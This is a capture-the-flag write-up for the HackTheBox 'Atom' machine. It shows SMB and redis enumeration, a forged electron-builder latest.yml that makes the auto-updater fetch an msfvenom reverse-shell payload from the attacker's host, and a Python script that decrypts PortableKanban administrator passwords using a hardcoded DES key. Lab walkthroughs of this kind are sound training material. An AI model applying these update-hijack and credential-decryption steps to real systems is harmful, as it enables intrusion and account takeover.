---
title: HackTheBox - Atom Writeup
date: 2021-05-08 09:45:47 +07:00
categories: hackthebox
#modified: 20-08-29 09:24:47 +07:00
#tags: [blog, netlify, jekyll, github]
description: HackTheBox Atom Writeup.
---

<h1 align="center"> HTB Atom - Writeup</h1>

<p align="center">
 <img src="https://www.hackthebox.eu/storage/avatars/27ea1e1be5e83989ad5b6361773f4eaa.png">
</p>

*[Find the official link for HacktheBox - Atom here!](https://app.hackthebox.eu/machines/340)*


----------------------------------------------------------------------------------------------------

## FOOTHOLD

- Start a nmap scan with default script and version detections and the verbosity flag turned on to see open ports on the fly without having to wait for the scan to finish.
    ![Image](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/ctf/HackTheBox_Atom_Writeup/images/atom1.png)
- A full port scan reveals redis is active on port `6379` along w winrm at 5985 which shows we can probably use remoting with authentic creds.
    ![Image](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/ctf/HackTheBox_Atom_Writeup/images/atom2.png)
- We start off by enumerating port 80.
    - We find a possible username at the end of the page: MrR3boot@atom.htb.
    - From this we infer and add `atom.htb` to our `/etc/hosts` file. Continue browsing the site.
    - Directory Bruteforcing with gobuster results in nothing too userful, moving on. 

### Enumerating redis

- Much cant be enumerated since redis requires credentials to authenticate. Checking the format of authentication shows it requires only the password. We could attempt to brute force the password if nothing turns up from smb.
    ![Image](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/ctf/HackTheBox_Atom_Writeup/images/atom7.png)

### Enumerating smb

- `smbmap` shows use we have access to 2 shares amongst. **Software_Updates** seems interesting as we have **right access** too to it.
    ![Image](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/ctf/HackTheBox_Atom_Writeup/images/atom3.png)
- Using `smbclient` to connect to the share with null authentication:
    ![Image](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/ctf/HackTheBox_Atom_Writeup/images/atom4.png)
- Grap the pdf in the share. Looking at the pdf we infer 2 things:
    1. **Built with : electron-builder**
    2. We can place the update in any client folder and the automated script would check the update. We can probably replace some code to give us a shell here.
- This link explains a suitable exploit: [electron-builder-Exploit](https://blog.doyensec.com/2020/02/24/electron-updater-update-signature-bypass.html)
- In short is a vulnerability caused by an unescaped variable. We can trigger a parse error in the script to achieve code execution.
- The exploit bypasses inbuilt signature checks as shown below.
    ![Image](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/ctf/HackTheBox_Atom_Writeup/images/atom5.png)
    ![Image](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/ctf/HackTheBox_Atom_Writeup/images/atom6.png)

----------------------------------------------------------------------------------------------------

## POST EXPLOITATION

***GETTING user.txt***
- Generate an msfvenom payload of choice . Generate a reverse https executable and then rename it with single quotes.
    ![Image](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/ctf/HackTheBox_Atom_Writeup/images/atom8.png)
- Rename the file to the filename as `d'payload.exe` as shown.
    ![Image](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/ctf/HackTheBox_Atom_Writeup/images/atom10.png)
- Calculate the hash using the prescribed syntax as shown below: 
    ![Image](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/ctf/HackTheBox_Atom_Writeup/images/atom9.png)
- Setup a listener on msfconsole to catch your shell using `multi/handler`.
- Generate the `latest.yml` file update. Replace the path and the hash.
    ```bash
    version: 1.2.3
    path: http://10.10.14.52/d'payload.exe 
    sha512: a/xp95BNvRKGxbxRZv+1LOEIs9uaSX6wGz6ip+RDX2XjNkTFVJbwIZ9T21SN40sq/78zYZmb9IxATX710s58Rg==
    ```
- Start a server to host `d'payload.exe` using: `sudo python -m SimpleHTTPServer 80`
- Finally put the update file in one of the client folders on the share using smbclient. Wait for about 15-20 secs and let the update happen. A meterpreter shell is recieved.
    ![Image](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/ctf/HackTheBox_Atom_Writeup/images/atom11.png)
- A getuid command confirms we are `ATOM\jason`.
- Retrive `user.txt` from jason's dekstop folder.

***GETTING root.txt***
- Enumerate the host with winpeas. Begin by dropping winpeas on the box.
    ![Image](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/ctf/HackTheBox_Atom_Writeup/images/atom12.png)
- Jason's credentials do not allow `winrm` remoting. A user guide pdf exists which we might have a look at if needed.
    ![Image](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/ctf/HackTheBox_Atom_Writeup/images/atom13.jpg)
    ![Image](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/ctf/HackTheBox_Atom_Writeup/images/atom17.png)
- Since we already know redis was on,  we find its config file. 
    ![Image](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/ctf/HackTheBox_Atom_Writeup/images/atom14.png)
- We finally found the password for the redis server as shown. 
    ![Image](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/ctf/HackTheBox_Atom_Writeup/images/atom15.jpg)
- Use this [guide](https://book.hacktricks.xyz/pentesting/6379-pentesting-redis) as a reference to pentest redis.
- Now follow these steps:
    1. Connect to redis using:
    `redis -h 10.10.10.237`
    2. Authenticate using the password:
    `auth pass`
    3. Retrive info on the keyspace using:
    `info keyspace`
    4. We see that there is one databse - number 0 which has 4 keys. View the keys using: `keys *`
    5. We see a bunch of keys. Retrieve the first or last, it might most likely be the administrator's key: `get pk:urn:user:e8e29158-d70d-44b1-a1ba-4949d52790a0`
    ![Image](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/ctf/HackTheBox_Atom_Writeup/images/atom16.jpg)
- We now have the administrator hash.
- Ater looking a lot on how to decrypt the hash i decided to look back at the "User guide.pdf" to look for further clues.
    ![Image](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/ctf/HackTheBox_Atom_Writeup/images/atom18.png)
- Googling around it is figured that portable-kanban stores the settings for the encrypted password.
- Searching around for an exploit an encrypted password disclosure vulnerability is found [here](https://www.torchsec.net/portablekanban-4-3-6578-38136-encrypted-password-disclosure-torchsec/).
- Remove the unnecessary `except` statement.
- The python script:
    ```python
    import json
    import base64
    from des import * 

    #python3 -m pip install des

    try:
        hash = str(input("Enter the Hash : "))
        hash = base64.b64decode(hash.encode('utf-8'))
        key = DesKey(b"7ly6UznJ")
        print("Decrypted Password : " + key.decrypt(hash,initial=b"XuVUm5fR",padding=True).decode('utf-8'))
    except:
        print("Wrong Hash")
    ```
- Install `des` using: `sudo pip3 install des`

- Run the script, input your hash and get the decrypted hash. 
    
    ![Image](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/ctf/HackTheBox_Atom_Writeup/images/atom20.jpg)
- We now finally have the password for the administrator account. 
- Lets try winrm again using these credentials. The credentials are valid.
![Image](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/ctf/HackTheBox_Atom_Writeup/images/atom19.jpg)
- Grab `root.txt` from the Desktop of the Administrator's account.

----------------------------------------------------------------------------------------------------





